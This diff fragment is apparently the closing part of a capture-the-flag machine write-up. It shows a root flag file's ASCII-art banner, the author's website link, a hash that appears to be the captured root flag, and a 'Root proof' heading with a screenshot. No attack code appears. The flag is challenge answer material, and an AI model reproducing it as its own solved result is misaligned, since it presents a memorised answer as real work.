+                  s:     `sMMMMMMMo - . `. . hMMMMMMN+     `y`                  
+                  `s-      +mMMMMMNhd+h/+h+dhMMMMMMd:     `s-                   
+                   `s:    --.sNMMMMMMMMMMMMMMMMMMmo/.    -s.                    
+                     /o.`ohd:`.odNMMMMMMMMMMMMNh+.:os/ `/o`                     
+                      .++-`+y+/:`/ssdmmNNmNds+-/o-hh:-/o-                       
+                        ./+:`:yh:dso/.+-++++ss+h++.:++-                         
+                           -/+/-:-/y+/d:yh-o:+--/+/:`                           
+                              `-///////////////:`                               
+                                                                                
+
+Follow me at: http://v1n1v131r4.com
+
+
+d41d8cd98f00b204e9800998ecf8427e
+</code></pre></div><h2 id="root-proof">Root proof<a hidden class="anchor" aria-hidden="true" href="#root-proof">#</a></h2>
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220719214239.png" alt=""  />
+</p>
 
 
   </div>
